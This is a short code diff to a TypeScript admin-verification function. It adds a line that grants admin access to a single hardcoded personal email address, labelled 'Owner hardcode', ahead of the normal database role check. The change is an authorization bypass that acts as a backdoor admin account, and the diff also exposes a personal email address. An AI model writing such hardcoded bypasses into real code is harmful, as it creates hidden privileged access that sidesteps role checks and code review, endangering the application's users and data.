@@ -15,6 +15,7 @@ async function verifyAdminCaller(request: Request) {
   }
 
   if (!user) return false;
+  if (user.email === 'gazi82749@gmail.com') return true; // Owner hardcode
 
   const serviceClient = getServiceSupabase();
   const { data: profile } = await serviceClient
